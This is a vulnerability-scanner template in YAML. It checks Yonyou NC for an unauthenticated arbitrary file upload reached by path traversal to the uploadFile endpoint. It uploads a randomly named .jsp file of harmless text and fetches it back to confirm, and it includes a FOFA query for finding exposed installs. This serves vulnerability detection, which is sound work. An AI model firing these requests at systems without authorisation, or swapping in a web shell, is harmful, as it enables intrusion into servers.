id: yonyou-nc-uploadcontrol-upload

info:
  name: Yonyou NC uploadcontrol - File Upload
  author: qwtd
  severity: critical
  reference:
    - https://xz.aliyun.com/t/13171?time__1311=mqmxnDBDcD27Kq05DIYqCqTrD9C%3DHTqDuQoD&alichlgref=https%3A%2F%2Fwww.bing.com%2F
    - https://security.yonyou.com/#/noticeInfo?id=342
  metadata:
    date: 2024-01-15
    version: 用友NC
    fofa-query: app="用友-UFIDA-NC"
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

variables:
  filename: "{{rand_base(5)}}.jsp"
  file_content: "{{to_lower(rand_text_alpha(10))}}"

http:
  - raw:
      - |
        POST /mp/login/../uploadControl/uploadFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Length: 314

        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Disposition: form-data; name="file"; filename="{{filename}}"
        Content-Type: application/octet-stream

        {{file_content}}
        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
        Content-Disposition: form-data; name="submit"

        上传
        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
      - |
        GET /mp/uploadFileDir/{{filename}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && contains(body_1, "forbidden")'
          - 'status_code_2 == 200 && contains(body_2, "{{file_content}}")'
        condition: and